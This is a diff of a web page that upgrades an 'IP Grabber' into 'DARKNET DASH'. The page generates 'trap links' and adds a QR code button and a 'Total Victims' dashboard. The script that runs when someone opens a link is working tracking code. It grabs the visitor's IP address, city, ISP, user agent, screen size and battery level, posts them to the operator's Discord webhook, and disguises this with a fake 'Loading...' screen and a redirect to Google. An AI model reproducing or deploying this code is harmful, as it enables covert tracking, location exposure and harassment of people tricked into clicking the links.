@@ -1,53 +1,142 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="en" data-theme="dark">
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>IP Grabber</title>
+  <title>DARKNET DASH</title>
   <style>
+    :root {
+      --bg: #0a0a0a; --card: #111; --acc: #00ff41; --text: #e0e0e0; --gray: #333;
+    }
+    * { box-sizing: border-box; }
     body {
-      background: #000; color: #0f0; font-family: 'Courier New';
-      text-align: center; padding: 50px;
+      margin: 0; background: var(--bg); color: var(--text); font-family: 'Segoe UI', sans-serif;
+      padding: 20px; line-height: 1.6;
     }
+    .container { max-width: 900px; margin: auto; }
+    .header {
+      text-align: center; padding: 20px; border-bottom: 2px solid var(--acc);
+      margin-bottom: 30px;
+    }
+    .header h1 {
+      margin: 0; color: var(--acc); font-size: 2.5rem; text-shadow: 0 0 10px var(--acc);
+    }
+    .header p { margin: 10px 0 0; opacity: 0.8; }
+
+    .grid {
+      display: grid; grid-template-columns: 1fr 1fr; gap: 20px;
+    }
+    @media (max-width: 768px) { .grid { grid-template-columns: 1fr; } }
+
+    .card {
+      background: var(--card); border: 2px solid var(--acc); border-radius: 16px;
+      padding: 24px; box-shadow: 0 0 20px rgba(0,255,65,0.2);
+    }
+    h2 { margin: 0 0 16px; color: var(--acc); font-size: 1.4rem; }
+
     input, button {
-      padding: 12px; margin: 10px; width: 90%; max-width: 500px;
-      background: #111; border: 1px solid #0f0; color: #0f0;
-      font-size: 1.1rem;
+      width: 100%; padding: 14px; margin: 10px 0; border-radius: 10px; font-size: 1rem;
     }
-    button { background: #0f0; color: #000; cursor: pointer; font-weight: bold; }
-    #link { color: #0f0; word-break: break-all; margin: 20px; font-size: 1.2rem; }
-    label { display: flex; justify-content: center; align-items: center; margin: 12px 0; font-size: 1rem; }
-    input[type="checkbox"] { width: auto; transform: scale(1.4); margin: 0 10px; }
+    input {
+      background: #000; border: 1px solid var(--acc); color: var(--text);
+    }
+    button {
+      background: var(--acc); color: #000; border: none; font-weight: bold;
+      cursor: pointer; transition: 0.3s;
+    }
+    button:hover { background: #00cc33; transform: translateY(-2px); }
+
+    label {
+      display: flex; align-items: center; margin: 12px 0; font-size: 1rem;
+    }
+    input[type="checkbox"] {
+      width: auto; transform: scale(1.3); margin-right: 12px;
+    }
+
+    #generated {
+      background: #000; padding: 16px; border-radius: 10px; margin: 16px 0;
+      word-break: break-all; display: none;
+    }
+    #qr { text-align: center; margin: 16px 0; }
+    #qr img { border: 2px solid var(--acc); border-radius: 12px; }
+
+    #logs {
+      max-height: 400px; overflow-y: auto; padding: 10px; background: #000;
+      border-radius: 10px; border: 1px dashed var(--acc);
+    }
+    .log {
+      background: var(--gray); padding: 10px; margin: 8px 0;
+      border-left: 4px solid var(--acc); border-radius: 6px; font-size: 0.9rem;
+    }
+    .stats {
+      display: flex; justify-content: space-around; padding: 16px 0; font-size: 1.2rem;
+    }
+    .stat { text-align: center; }
+    .stat-num { font-size: 2rem; color: var(--acc); font-weight: bold; }
+
+    .footer {
+      text-align: center; margin: 50px 0 20px; font-size: 0.8rem; opacity: 0.5;
+    }
   </style>
 </head>
 <body>
-  <h1>IP GRABBER</h1>
-  <p>Enter your Discord webhook. Toggle options. Generate link. Profit.</p>
+  <div class="container">
+    <div class="header">
+      <h1>DARKNET DASH</h1>
+      <p>Generate. Track. Dominate.</p>
+    </div>
 
-  <input id="webhook" placeholder="https://discord.com/api/webhooks/..." />
+    <div class="grid">
+      <!-- GENERATOR -->
+      <div class="card">
+        <h2>CREATE TRAP LINK</h2>
+        <input id="webhook" placeholder="Discord webhook URL" />
 
-  <label><input type="checkbox" id="ip" checked> IP + Location</label>
-  <label><input type="checkbox" id="pc" checked> PC Info</label>
+        <label><input type="checkbox" id="ip" checked> IP + Location</label>
+        <label><input type="checkbox" id="pc" checked> PC Info (Device, Screen, Battery)</label>
 
-  <button onclick="generate()">GENERATE LINK</button>
+        <button onclick="generate()">GENERATE LINK</button>
 
-  <div id="result" style="display:none;">
-    <p><strong>Send this link:</strong></p>
-    <div id="link"></div>
-    <button onclick="copy()">COPY LINK</button>
+        <div id="generated">
+          <strong>Your Link:</strong><br>
+          <div id="link"></div>
+          <div style="display:flex;gap:10px;margin-top:10px;">
+            <button onclick="copy()" style="flex:1;">COPY</button>
+            <button onclick="showQR()" style="flex:1;">QR CODE</button>
+          </div>
+          <div id="qr"></div>
+        </div>
+      </div>
+
+      <!-- DASHBOARD -->
+      <div class="card">
+        <h2>LIVE DASHBOARD</h2>
+        <div class="stats">
+          <div class="stat">
+            <div class="stat-num" id="total">0</div>
+            <div>Total Victims</div>
+          </div>
+          <div class="stat">
+            <div class="stat-num" id="today">0</div>
+            <div>Today</div>
+          </div>
+        </div>
+        <button onclick="clearLogs()" style="margin:10px 0;">CLEAR LOGS</button>
+        <div id="logs"></div>
+      </div>
+    </div>
   </div>
 
+  <div class="footer">© 2025 DARKNET DASH – Built by Rex. No mercy.</div>
+
   <script>
-    function rand() {
-      return Math.random().toString(36).substr(2, 9);
-    }
+    const rand = () => Math.random().toString(36).substr(2, 9);
+    let logs = JSON.parse(localStorage.getItem("dash_logs") || "[]");
+    renderDashboard();
 
     function generate() {
       const webhook = document.getElementById("webhook").value.trim();
-      if (!webhook.includes("discord.com/api/webhooks")) {
-        alert("Enter a valid Discord webhook URL.");
-        return;
-      }
+      if (!webhook.includes("discord.com/api/webhooks")) return alert("Valid webhook required.");
 
       const config = {
         w: webhook,
@@ -57,74 +146,99 @@
 
       const id = rand();
       const link = `${location.origin}/?id=${id}`;
-      localStorage.setItem(`hook_${id}`, JSON.stringify(config));
+      localStorage.setItem(`trap_${id}`, JSON.stringify(config));
 
       document.getElementById("link").innerText = link;
-      document.getElementById("result").style.display = "block";
+      document.getElementById("generated").style.display = "block";
+      document.getElementById("qr").innerHTML = "";
     }
 
     function copy() {
-      const link = document.getElementById("link").innerText;
-      navigator.clipboard.writeText(link);
-      alert("Copied!");
+      navigator.clipboard.writeText(document.getElementById("link").innerText);
+      alert("Copied to clipboard!");
     }
 
-    // === GRAB ON LOAD ===
+    function showQR() {
+      const link = document.getElementById("link").innerText;
+      const qr = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(link)}`;
+      document.getElementById("qr").innerHTML = `<img src="${qr}" alt="QR Code" />`;
+    }
+
+    function renderDashboard() {
+      const box = document.getElementById("logs");
+      box.innerHTML = "";
+      const recent = logs.slice(-10).reverse();
+      recent.forEach(l => {
+        const div = document.createElement("div");
+        div.className = "log";
+        div.innerHTML = `<strong>${l.time}</strong><br>${l.ip} – ${l.loc}<br>${l.device.slice(0,40)}...`;
+        box.appendChild(div);
+      });
+      document.getElementById("total").innerText = logs.length;
+      const today = logs.filter(l => l.date === new Date().toLocaleDateString()).length;
+      document.getElementById("today").innerText = today;
+    }
+
+    function clearLogs() {
+      logs = [];
+      localStorage.setItem("dash_logs", "[]");
+      renderDashboard();
+    }
+
+    // === VICTIM TRAP ===
     if (location.search) {
-      const params = new URLSearchParams(location.search);
-      const id = params.get("id");
-      const config = JSON.parse(localStorage.getItem(`hook_${id}`) || "{}");
-      const webhook = config.w;
+      const id = new URLSearchParams(location.search).get("id");
+      const cfg = JSON.parse(localStorage.getItem(`trap_${id}`) || "{}");
+      if (!cfg.w) { location.href = "https://google.com"; return; }
 
-      if (webhook) {
-        (async () => {
+      document.body.innerHTML = `<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:#000;display:flex;align-items:center;justify-content:center;color:#0f0;font-family:monospace;"><h2>Loading...</h2></div>`;
+
+      (async () => {
+        const fields = [];
+        let ipData = {};
+
+        if (cfg.ip) {
           try {
-            const res = await fetch("https://ipapi.co/json/");
-            const data = await res.json();
+            ipData = await (await fetch("https://ipapi.co/json/")).json();
+            fields.push(
+              { name: "IP", value: ipData.ip, inline: true },
+              { name: "Location", value: `${ipData.city}, ${ipData.country_name}`, inline: true },
+              { name: "ISP", value: ipData.org || "??", inline: true }
+            );
+          } catch(e) {}
+        }
 
-            const fields = [];
+        if (cfg.pc) {
+          const bat = await navigator.getBattery?.() || {};
+          fields.push(
+            { name: "Device", value: navigator.userAgent.slice(0,100), inline: false },
+            { name: "Screen", value: `${screen.width}x${screen.height}`, inline: true },
+            { name: "Battery", value: bat.level ? Math.round(bat.level*100)+"%" : "N/A", inline: true }
+          );
+        }
 
-            if (config.ip) {
-              fields.push(
-                { name: "IP", value: data.ip, inline: true },
-                { name: "Location", value: `${data.city}, ${data.country_name}`, inline: true },
-                { name: "ISP", value: data.org || "Unknown", inline: true }
-              );
-            }
+        await fetch(cfg.w, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            embeds: [{ title: "NEW VICTIM", color: 65280, fields, timestamp: new Date().toISOString() }]
+          })
+        });
 
-            if (config.pc) {
-              const battery = await navigator.getBattery?.() || {};
-              fields.push(
-                { name: "Device", value: navigator.userAgent.slice(0, 100), inline: false },
-                { name: "Screen", value: `${screen.width}x${screen.height}`, inline: true },
-                { name: "Battery", value: battery.level ? Math.round(battery.level * 100) + "%" : "N/A", inline: true },
-                { name: "Timezone", value: Intl.DateTimeFormat().resolvedOptions().timeZone, inline: true }
-              );
-            }
+        // SAVE TO DASHBOARD
+        const logEntry = {
+          time: new Date().toLocaleTimeString(),
+          date: new Date().toLocaleDateString(),
+          ip: ipData.ip || "??",
+          loc: `${ipData.city || "?"} , ${ipData.country_name || "?"}`,
+          device: navigator.userAgent
+        };
+        const all = JSON.parse(localStorage.getItem("dash_logs") || "[]");
+        all.push(logEntry);
+        localStorage.setItem("dash_logs", JSON.stringify(all));
 
-            const payload = {
-              embeds: [{
-                title: "NEW IP GRABBED",
-                color: 65280,
-                fields: fields,
-                timestamp: new Date().toISOString()
-              }]
-            };
-
-            await fetch(webhook, {
-              method: "POST",
-              headers: { "Content-Type": "application/json" },
-              body: JSON.stringify(payload)
-            });
-
-            setTimeout(() => location.href = "https://google.com", 500);
-          } catch (e) {
-            setTimeout(() => location.href = "https://google.com", 500);
-          }
-        })();
-      }
-
-      document.body.innerHTML = "<h2 style='color:#0f0;'>Loading...</h2>";
+        setTimeout(() => location.replace("https://google.com"), 600);
+      })();
     }
   </script>
 </body>
